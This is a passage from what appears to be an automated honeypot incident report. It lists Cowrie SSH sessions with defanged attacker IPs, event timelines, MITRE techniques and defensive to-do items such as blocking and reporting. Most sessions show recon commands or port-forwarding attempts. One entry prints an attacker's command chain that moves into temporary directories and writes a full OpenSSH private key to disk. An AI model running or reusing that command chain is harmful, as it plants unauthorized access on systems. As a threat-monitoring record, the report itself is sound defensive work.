| `2026-08-19 07:13:34` | `cowrie.client.version` |
| `2026-08-19 07:13:34` | `cowrie.client.kex` |
| `2026-08-19 07:13:35` | `cowrie.login.success` |
| `2026-08-19 07:13:36` | `cowrie.session.params` |
| `2026-08-19 07:13:36` | `cowrie.command.input` |
| `2026-08-19 07:13:36` | `cowrie.command.failed` |
| `2026-08-19 07:13:36` | `cowrie.log.closed` |
| `2026-08-19 07:13:37` | `cowrie.session.params` |
| `2026-08-19 07:13:37` | `cowrie.command.input` |
| `2026-08-19 07:13:38` | `cowrie.session.file_download` |
| `2026-08-19 07:13:38` | `cowrie.log.closed` |
| `2026-08-19 07:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.132[.]164` to AbuseIPDB if not already reported
- [ ] Block `218.78.132[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33a738d08d1b

| Field | Detail |
|---|---|
| **Source IP** | `218.78.132[.]164` |
| **First Seen** | 2026-08-19 07:13 |
| **Last Seen** | 2026-08-19 07:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:13:46` | `cowrie.session.connect` |
| `2026-08-19 07:13:47` | `cowrie.client.version` |
| `2026-08-19 07:13:47` | `cowrie.client.kex` |
| `2026-08-19 07:13:48` | `cowrie.login.success` |
| `2026-08-19 07:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.132[.]164` to AbuseIPDB if not already reported
- [ ] Block `218.78.132[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c28d4d1bcc49

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 07:15 |
| **Last Seen** | 2026-08-19 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:15:15` | `cowrie.session.connect` |
| `2026-08-19 07:15:15` | `cowrie.client.version` |
| `2026-08-19 07:15:15` | `cowrie.client.kex` |
| `2026-08-19 07:15:15` | `cowrie.login.success` |
| `2026-08-19 07:15:16` | `cowrie.session.params` |
| `2026-08-19 07:15:16` | `cowrie.command.input` |
| `2026-08-19 07:15:16` | `cowrie.log.closed` |
| `2026-08-19 07:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-998862c77762

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 07:19 |
| **Last Seen** | 2026-08-19 07:19 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:19:13` | `cowrie.session.connect` |
| `2026-08-19 07:19:14` | `cowrie.client.version` |
| `2026-08-19 07:19:14` | `cowrie.client.kex` |
| `2026-08-19 07:19:21` | `cowrie.login.success` |
| `2026-08-19 07:19:26` | `cowrie.session.params` |
| `2026-08-19 07:19:26` | `cowrie.command.input` |
| `2026-08-19 07:19:27` | `cowrie.log.closed` |
| `2026-08-19 07:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08a4e0b120a2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-19 07:19 |
| **Last Seen** | 2026-08-19 07:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:19:57` | `cowrie.session.connect` |
| `2026-08-19 07:19:57` | `cowrie.client.version` |
| `2026-08-19 07:19:57` | `cowrie.client.kex` |
| `2026-08-19 07:19:58` | `cowrie.login.success` |
| `2026-08-19 07:19:58` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:19:58` | `cowrie.direct-tcpip.data` |
| `2026-08-19 07:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6faab59d193a

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 07:21 |
| **Last Seen** | 2026-08-19 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:21:11` | `cowrie.session.connect` |
| `2026-08-19 07:21:11` | `cowrie.client.version` |
| `2026-08-19 07:21:11` | `cowrie.client.kex` |
| `2026-08-19 07:21:12` | `cowrie.login.success` |
| `2026-08-19 07:21:12` | `cowrie.session.params` |
| `2026-08-19 07:21:12` | `cowrie.command.input` |
| `2026-08-19 07:21:13` | `cowrie.log.closed` |
| `2026-08-19 07:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f688386e3050

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-08-19 07:24 |
| **Last Seen** | 2026-08-19 07:24 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:24:13` | `cowrie.session.connect` |
| `2026-08-19 07:24:15` | `cowrie.client.version` |
| `2026-08-19 07:24:15` | `cowrie.client.kex` |
| `2026-08-19 07:24:23` | `cowrie.login.success` |
| `2026-08-19 07:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a0309ef3b74

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-08-19 07:24 |
| **Last Seen** | 2026-08-19 07:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:24:27` | `cowrie.session.connect` |
| `2026-08-19 07:24:27` | `cowrie.client.version` |
| `2026-08-19 07:24:27` | `cowrie.client.kex` |
| `2026-08-19 07:24:28` | `cowrie.login.success` |
| `2026-08-19 07:24:30` | `cowrie.session.params` |
| `2026-08-19 07:24:30` | `cowrie.command.input` |
| `2026-08-19 07:24:30` | `cowrie.session.file_download` |
| `2026-08-19 07:24:30` | `cowrie.session.file_download` |
| `2026-08-19 07:24:30` | `cowrie.log.closed` |
| `2026-08-19 07:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-600f07695e4a

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 07:27 |
| **Last Seen** | 2026-08-19 07:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:27:08` | `cowrie.session.connect` |
| `2026-08-19 07:27:08` | `cowrie.client.version` |
| `2026-08-19 07:27:08` | `cowrie.client.kex` |
| `2026-08-19 07:27:08` | `cowrie.login.success` |
| `2026-08-19 07:27:09` | `cowrie.session.params` |
| `2026-08-19 07:27:09` | `cowrie.command.input` |
| `2026-08-19 07:27:09` | `cowrie.log.closed` |
| `2026-08-19 07:27:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b94beb6bc348

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 07:31 |
| **Last Seen** | 2026-08-19 07:31 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:31:30` | `cowrie.session.connect` |
| `2026-08-19 07:31:32` | `cowrie.client.version` |
| `2026-08-19 07:31:32` | `cowrie.client.kex` |
| `2026-08-19 07:31:39` | `cowrie.login.success` |
| `2026-08-19 07:31:43` | `cowrie.session.params` |
| `2026-08-19 07:31:43` | `cowrie.command.input` |
| `2026-08-19 07:31:46` | `cowrie.log.closed` |
| `2026-08-19 07:31:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1e459630026

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 07:33 |
| **Last Seen** | 2026-08-19 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:33:04` | `cowrie.session.connect` |
| `2026-08-19 07:33:04` | `cowrie.client.version` |
| `2026-08-19 07:33:04` | `cowrie.client.kex` |
| `2026-08-19 07:33:04` | `cowrie.login.success` |
| `2026-08-19 07:33:05` | `cowrie.session.params` |
| `2026-08-19 07:33:05` | `cowrie.command.input` |
| `2026-08-19 07:33:05` | `cowrie.log.closed` |
| `2026-08-19 07:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7056c4509ad1

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]41` |
| **First Seen** | 2026-08-19 07:33 |
| **Last Seen** | 2026-08-19 07:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:33:07` | `cowrie.session.connect` |
| `2026-08-19 07:33:08` | `cowrie.client.version` |
| `2026-08-19 07:33:08` | `cowrie.client.kex` |
| `2026-08-19 07:33:09` | `cowrie.login.success` |
| `2026-08-19 07:33:10` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ec8c0babc7e

| Field | Detail |
|---|---|
| **Source IP** | `194.31.8[.]12` |
| **First Seen** | 2026-08-19 07:33 |
| **Last Seen** | 2026-08-19 07:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:33:15` | `cowrie.session.connect` |
| `2026-08-19 07:33:16` | `cowrie.client.version` |
| `2026-08-19 07:33:16` | `cowrie.client.kex` |
| `2026-08-19 07:33:17` | `cowrie.login.success` |
| `2026-08-19 07:33:17` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.31.8[.]12` to AbuseIPDB if not already reported
- [ ] Block `194.31.8[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db97c581c479

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]119` |
| **First Seen** | 2026-08-19 07:38 |
| **Last Seen** | 2026-08-19 07:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:38:24` | `cowrie.session.connect` |
| `2026-08-19 07:38:24` | `cowrie.client.version` |
| `2026-08-19 07:38:24` | `cowrie.client.kex` |
| `2026-08-19 07:38:26` | `cowrie.login.success` |
| `2026-08-19 07:38:26` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]119` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df16740fad64

| Field | Detail |
|---|---|
| **Source IP** | `36.92.35[.]211` |
| **First Seen** | 2026-08-19 07:38 |
| **Last Seen** | 2026-08-19 07:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:38:31` | `cowrie.session.connect` |
| `2026-08-19 07:38:32` | `cowrie.client.version` |
| `2026-08-19 07:38:32` | `cowrie.client.kex` |
| `2026-08-19 07:38:36` | `cowrie.login.success` |
| `2026-08-19 07:38:37` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.35[.]211` to AbuseIPDB if not already reported
- [ ] Block `36.92.35[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5e735774352

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 07:39 |
| **Last Seen** | 2026-08-19 07:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:39:00` | `cowrie.session.connect` |
| `2026-08-19 07:39:00` | `cowrie.client.version` |
| `2026-08-19 07:39:00` | `cowrie.client.kex` |
| `2026-08-19 07:39:01` | `cowrie.login.success` |
| `2026-08-19 07:39:01` | `cowrie.session.params` |
| `2026-08-19 07:39:01` | `cowrie.command.input` |
| `2026-08-19 07:39:01` | `cowrie.log.closed` |
| `2026-08-19 07:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7a22f5907ca

| Field | Detail |
|---|---|
| **Source IP** | `65.20.153[.]146` |
| **First Seen** | 2026-08-19 07:41 |
| **Last Seen** | 2026-08-19 07:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:41:11` | `cowrie.session.connect` |
| `2026-08-19 07:41:12` | `cowrie.client.version` |
| `2026-08-19 07:41:12` | `cowrie.client.kex` |
| `2026-08-19 07:41:13` | `cowrie.login.success` |
| `2026-08-19 07:41:13` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.153[.]146` to AbuseIPDB if not already reported
- [ ] Block `65.20.153[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c18c5eece336

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-08-19 07:41 |
| **Last Seen** | 2026-08-19 07:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:41:19` | `cowrie.session.connect` |
| `2026-08-19 07:41:20` | `cowrie.client.version` |
| `2026-08-19 07:41:20` | `cowrie.client.kex` |
| `2026-08-19 07:41:22` | `cowrie.login.success` |
| `2026-08-19 07:41:22` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aa96f357e45

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-19 07:41 |
| **Last Seen** | 2026-08-19 07:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:41:24` | `cowrie.session.connect` |
| `2026-08-19 07:41:24` | `cowrie.client.version` |
| `2026-08-19 07:41:24` | `cowrie.client.kex` |
| `2026-08-19 07:41:25` | `cowrie.login.success` |
| `2026-08-19 07:41:26` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2566b2d80da

| Field | Detail |
|---|---|
| **Source IP** | `213.33.204[.]130` |
| **First Seen** | 2026-08-19 07:41 |
| **Last Seen** | 2026-08-19 07:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:41:32` | `cowrie.session.connect` |
| `2026-08-19 07:41:32` | `cowrie.client.version` |
| `2026-08-19 07:41:32` | `cowrie.client.kex` |
| `2026-08-19 07:41:34` | `cowrie.login.success` |
| `2026-08-19 07:41:34` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:41:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891dd76f5ef4

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 07:43 |
| **Last Seen** | 2026-08-19 07:44 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:43:47` | `cowrie.session.connect` |
| `2026-08-19 07:43:48` | `cowrie.client.version` |
| `2026-08-19 07:43:48` | `cowrie.client.kex` |
| `2026-08-19 07:43:56` | `cowrie.login.success` |
| `2026-08-19 07:44:00` | `cowrie.session.params` |
| `2026-08-19 07:44:00` | `cowrie.command.input` |
| `2026-08-19 07:44:01` | `cowrie.log.closed` |
| `2026-08-19 07:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2d5096d555a

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 07:44 |
| **Last Seen** | 2026-08-19 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:44:57` | `cowrie.session.connect` |
| `2026-08-19 07:44:57` | `cowrie.client.version` |
| `2026-08-19 07:44:57` | `cowrie.client.kex` |
| `2026-08-19 07:44:58` | `cowrie.login.success` |
| `2026-08-19 07:44:58` | `cowrie.session.params` |
| `2026-08-19 07:44:58` | `cowrie.command.input` |
| `2026-08-19 07:44:58` | `cowrie.log.closed` |
| `2026-08-19 07:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bd5ed307b12

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 07:50 |
| **Last Seen** | 2026-08-19 07:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:50:54` | `cowrie.session.connect` |
| `2026-08-19 07:50:54` | `cowrie.client.version` |
| `2026-08-19 07:50:54` | `cowrie.client.kex` |
| `2026-08-19 07:50:54` | `cowrie.login.success` |
| `2026-08-19 07:50:55` | `cowrie.session.params` |
| `2026-08-19 07:50:55` | `cowrie.command.input` |
| `2026-08-19 07:50:55` | `cowrie.log.closed` |
| `2026-08-19 07:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48dda37b59a8

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 07:55 |
| **Last Seen** | 2026-08-19 07:56 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:55:57` | `cowrie.session.connect` |
| `2026-08-19 07:55:59` | `cowrie.client.version` |
| `2026-08-19 07:55:59` | `cowrie.client.kex` |
| `2026-08-19 07:56:06` | `cowrie.login.success` |
| `2026-08-19 07:56:10` | `cowrie.session.params` |
| `2026-08-19 07:56:10` | `cowrie.command.input` |
| `2026-08-19 07:56:11` | `cowrie.log.closed` |
| `2026-08-19 07:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8b28008390d

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 07:56 |
| **Last Seen** | 2026-08-19 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:56:50` | `cowrie.session.connect` |
| `2026-08-19 07:56:50` | `cowrie.client.version` |
| `2026-08-19 07:56:50` | `cowrie.client.kex` |
| `2026-08-19 07:56:51` | `cowrie.login.success` |
| `2026-08-19 07:56:52` | `cowrie.session.params` |
| `2026-08-19 07:56:52` | `cowrie.command.input` |
| `2026-08-19 07:56:52` | `cowrie.log.closed` |
| `2026-08-19 07:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0d8c69e86f0

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
